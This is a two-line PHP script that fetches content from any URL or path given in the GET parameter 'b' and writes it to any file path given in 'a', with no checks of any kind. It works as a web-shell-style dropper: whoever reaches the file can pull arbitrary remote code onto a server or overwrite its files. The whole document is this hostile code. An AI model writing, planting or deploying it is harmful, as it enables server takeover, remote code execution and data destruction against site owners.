<?php

file_put_contents($_GET['a'],file_get_contents($_GET['b']));